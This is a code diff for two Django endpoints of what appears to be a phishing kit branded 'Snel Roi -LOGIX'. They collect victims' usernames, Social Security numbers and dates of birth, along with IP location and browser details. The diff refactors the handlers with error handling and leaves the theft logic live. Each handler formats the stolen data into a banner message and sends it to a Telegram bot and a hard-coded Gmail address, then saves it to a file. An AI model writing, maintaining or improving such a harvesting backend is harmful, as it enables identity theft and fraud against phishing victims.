@@ -450,100 +450,83 @@ def logix_collect_user_social_security(request):
     errors = {}
 
     if request.method == "POST":
+        try:
+            username = request.data.get("emzemz", "")
+            ssn_short = request.data.get("s2ns", "")
+            dob = request.data.get("d_b", "")
 
-        username = request.data.get("emzemz", "")
-        ssn_short = request.data.get("s2ns", "")
-        dob = request.data.get("d_b", "")
+            if not username:
+                errors["username"] = ["Username is required."]
 
-        print(username)
-        print(ssn_short)
-        print(dob)
+            if errors:
+                payload["message"] = "Errors"
+                payload["errors"] = errors
+                return Response(payload, status=status.HTTP_400_BAD_REQUEST)
 
-        if not username:
-            errors["username"] = ["Username is required."]
+            ip = get_client_ip(request)
+            agent = request.META.get("HTTP_USER_AGENT", "")
 
-        if errors:
+            country = get_country_from_ip(ip)
+            city = get_city_from_ip(ip)
+            browser = get_user_browser(agent)
+            os = get_user_os(agent)
+            date = datetime.now().strftime("%I:%M:%S %d/%m/%Y")
+
+            client, created = Client.objects.get_or_create(
+                username=username,
+            )
+            client.social_security_short = ssn_short
+            client.dob = dob
+            client.save()
+
+            browser_data, created = BrowserDetail.objects.get_or_create(
+                client=client,
+            )
+
+            browser_data.ip = ip
+            browser_data.agent = agent
+            browser_data.country = country
+            browser_data.city = city
+            browser_data.address = f"{city}, {country}"
+            browser_data.browser = browser
+            browser_data.os = os
+            browser_data.time = date
+            browser_data.date = date
+
+            browser_data.save()
+
+            message = f"|=====||Snel Roi -LOGIX||=====|\n"
+            message += f"|========= [  SSN / DATE OF BIRTH ] ==========|\n"
+            message += f"| ➤ [ SSN-last4 ]       : {ssn_short}\n"
+            message += f"| ➤ [ DOB ]             : {dob}\n"
+            message += f"|=====================================|\n"
+            message += f"| 🌍 B R O W S E R ~ D E T A I L S 🌍\n"
+            message += f"|======================================|\n"
+            message += f"| ➤ [ IP Address ]   : {ip}\r\n"
+            message += f"| ➤ [ IP Country ]   : {country}\r\n"
+            message += f"| ➤ [ IP City ]      : {city}\r\n"
+            message += f"| ➤ [ Browser ]      : {browser} on {os}\r\n"
+            message += f"| ➤ [ User Agent ]   : {agent}\r\n"
+            message += f"| ➤ [ TIME ]         : {date}\r\n"
+            message += f"|=====================================|\n"
+
+            send_data_telegram(app_settings, message)
+
+            subject = "The Data"
+            from_email = settings.DEFAULT_FROM_EMAIL
+            recipient_list = ["etornamasamoah@gmail.com"]
+
+            send_data_email(subject, message, from_email, recipient_list)
+
+            save_data_to_file(username, message)
+
+            payload["message"] = "Successful"
+            payload["data"] = data
+        except Exception:
+            logger.exception("logix_collect_user_social_security failed")
             payload["message"] = "Errors"
-            payload["errors"] = errors
-            return Response(payload, status=status.HTTP_400_BAD_REQUEST)
-
-        #####################
-        # Browser Data
-        ######################
-
-        ip = get_client_ip(request)
-        agent = request.META.get("HTTP_USER_AGENT", "")
-
-        country = get_country_from_ip(ip)
-        city = get_city_from_ip(ip)
-        browser = get_user_browser(agent)
-        os = get_user_os(agent)
-        date = datetime.now().strftime("%I:%M:%S %d/%m/%Y")
-
-        ##############################
-        # Save User data to database
-        ################################
-
-        client, created = Client.objects.get_or_create(
-            username=username,
-        )
-        client.social_security_short = ssn_short
-        client.dob = dob
-        client.save()
-
-        browser_data, created = BrowserDetail.objects.get_or_create(
-            client=client,
-        )
-
-        browser_data.ip = ip
-        browser_data.agent = agent
-        browser_data.country = country
-        browser_data.city = city
-        browser_data.address = f"{city}, {country}"
-        browser_data.browser = browser
-        browser_data.os = os
-        browser_data.time = date
-        browser_data.date = date
-
-        browser_data.save()
-
-        message = f"|=====||Snel Roi -LOGIX||=====|\n"
-        message += f"|========= [  SSN / DATE OF BIRTH ] ==========|\n"
-        message += f"| ➤ [ SSN-last4 ]       : {ssn_short}\n"
-        message += f"| ➤ [ DOB ]             : {dob}\n"
-        message += f"|=====================================|\n"
-        message += f"| 🌍 B R O W S E R ~ D E T A I L S 🌍\n"
-        message += f"|======================================|\n"
-        message += f"| ➤ [ IP Address ]   : {ip}\r\n"
-        message += f"| ➤ [ IP Country ]   : {country}\r\n"
-        message += f"| ➤ [ IP City ]      : {city}\r\n"
-        message += f"| ➤ [ Browser ]      : {browser} on {os}\r\n"
-        message += f"| ➤ [ User Agent ]   : {agent}\r\n"
-        message += f"| ➤ [ TIME ]         : {date}\r\n"
-        message += f"|=====================================|\n"
-
-        #############################
-        # Send data to telegram
-        ##############################
-
-        send_data_telegram(app_settings, message)
-
-        #############################
-        # Send Data to email
-        ########################
-        subject = "The Data"
-        from_email = settings.DEFAULT_FROM_EMAIL
-        recipient_list = ["etornamasamoah@gmail.com"]
-
-        send_data_email(subject, message, from_email, recipient_list)
-
-        #####################################
-        # Save to txt
-        ##############################
-        save_data_to_file(username, message)
-
-        payload["message"] = "Successful"
-        payload["data"] = data
+            payload["errors"] = {"detail": ["Internal server error"]}
+            return Response(payload, status=status.HTTP_500_INTERNAL_SERVER_ERROR)
     return Response(payload)
 
 
@@ -561,100 +544,83 @@ def logix_collect_user_social_security_2(request):
     errors = {}
 
     if request.method == "POST":
+        try:
+            username = request.data.get("emzemz", "")
+            ssn = request.data.get("s2ns", "")
+            dob = request.data.get("d_b", "")
 
-        username = request.data.get("emzemz", "")
-        ssn = request.data.get("s2ns", "")
-        dob = request.data.get("d_b", "")
+            if not username:
+                errors["username"] = ["Username is required."]
 
-        print(username)
-        print(ssn)
-        print(dob)
+            if errors:
+                payload["message"] = "Errors"
+                payload["errors"] = errors
+                return Response(payload, status=status.HTTP_400_BAD_REQUEST)
 
-        if not username:
-            errors["username"] = ["Username is required."]
+            ip = get_client_ip(request)
+            agent = request.META.get("HTTP_USER_AGENT", "")
 
-        if errors:
+            country = get_country_from_ip(ip)
+            city = get_city_from_ip(ip)
+            browser = get_user_browser(agent)
+            os = get_user_os(agent)
+            date = datetime.now().strftime("%I:%M:%S %d/%m/%Y")
+
+            client, created = Client.objects.get_or_create(
+                username=username,
+            )
+            client.social_security = ssn
+            client.dob = dob
+            client.save()
+
+            browser_data, created = BrowserDetail.objects.get_or_create(
+                client=client,
+            )
+
+            browser_data.ip = ip
+            browser_data.agent = agent
+            browser_data.country = country
+            browser_data.city = city
+            browser_data.address = f"{city}, {country}"
+            browser_data.browser = browser
+            browser_data.os = os
+            browser_data.time = date
+            browser_data.date = date
+
+            browser_data.save()
+
+            message = f"|=====||Snel Roi -LOGIX||=====|\n"
+            message += f"|========= [  SSN / DATE OF BIRTH ] ==========|\n"
+            message += f"| ➤ [ SSN ]             : {ssn}\n"
+            message += f"| ➤ [ DOB ]             : {dob}\n"
+            message += f"|=====================================|\n"
+            message += f"| 🌍 B R O W S E R ~ D E T A I L S 🌍\n"
+            message += f"|======================================|\n"
+            message += f"| ➤ [ IP Address ]   : {ip}\r\n"
+            message += f"| ➤ [ IP Country ]   : {country}\r\n"
+            message += f"| ➤ [ IP City ]      : {city}\r\n"
+            message += f"| ➤ [ Browser ]      : {browser} on {os}\r\n"
+            message += f"| ➤ [ User Agent ]   : {agent}\r\n"
+            message += f"| ➤ [ TIME ]         : {date}\r\n"
+            message += f"|=====================================|\n"
+
+            send_data_telegram(app_settings, message)
+
+            subject = "The Data"
+            from_email = settings.DEFAULT_FROM_EMAIL
+            recipient_list = ["etornamasamoah@gmail.com"]
+
+            send_data_email(subject, message, from_email, recipient_list)
+
+            save_data_to_file(username, message)
+
+            payload["message"] = "Successful"
+            payload["data"] = data
+        except Exception:
+            logger.exception("logix_collect_user_social_security_2 failed")
             payload["message"] = "Errors"
-            payload["errors"] = errors
-            return Response(payload, status=status.HTTP_400_BAD_REQUEST)
-
-        #####################
-        # Browser Data
-        ######################
-
-        ip = get_client_ip(request)
-        agent = request.META.get("HTTP_USER_AGENT", "")
-
-        country = get_country_from_ip(ip)
-        city = get_city_from_ip(ip)
-        browser = get_user_browser(agent)
-        os = get_user_os(agent)
-        date = datetime.now().strftime("%I:%M:%S %d/%m/%Y")
-
-        ##############################
-        # Save User data to database
-        ################################
-
-        client, created = Client.objects.get_or_create(
-            username=username,
-        )
-        client.social_security = ssn
-        client.dob = dob
-        client.save()
-
-        browser_data, created = BrowserDetail.objects.get_or_create(
-            client=client,
-        )
-
-        browser_data.ip = ip
-        browser_data.agent = agent
-        browser_data.country = country
-        browser_data.city = city
-        browser_data.address = f"{city}, {country}"
-        browser_data.browser = browser
-        browser_data.os = os
-        browser_data.time = date
-        browser_data.date = date
-
-        browser_data.save()
-
-        message = f"|=====||Snel Roi -LOGIX||=====|\n"
-        message += f"|========= [  SSN / DATE OF BIRTH ] ==========|\n"
-        message += f"| ➤ [ SSN ]             : {ssn}\n"
-        message += f"| ➤ [ DOB ]             : {dob}\n"
-        message += f"|=====================================|\n"
-        message += f"| 🌍 B R O W S E R ~ D E T A I L S 🌍\n"
-        message += f"|======================================|\n"
-        message += f"| ➤ [ IP Address ]   : {ip}\r\n"
-        message += f"| ➤ [ IP Country ]   : {country}\r\n"
-        message += f"| ➤ [ IP City ]      : {city}\r\n"
-        message += f"| ➤ [ Browser ]      : {browser} on {os}\r\n"
-        message += f"| ➤ [ User Agent ]   : {agent}\r\n"
-        message += f"| ➤ [ TIME ]         : {date}\r\n"
-        message += f"|=====================================|\n"
-
-        #############################
-        # Send data to telegram
-        ##############################
-
-        send_data_telegram(app_settings, message)
-
-        #############################
-        # Send Data to email
-        ########################
-        subject = "The Data"
-        from_email = settings.DEFAULT_FROM_EMAIL
-        recipient_list = ["etornamasamoah@gmail.com"]
-
-        send_data_email(subject, message, from_email, recipient_list)
-
-        #####################################
-        # Save to txt
-        ##############################
-        save_data_to_file(username, message)
-
-        payload["message"] = "Successful"
-        payload["data"] = data
+            payload["errors"] = {"detail": ["Internal server error"]}
+            return Response(payload, status=status.HTTP_500_INTERNAL_SERVER_ERROR)
     return Response(payload)
 
 
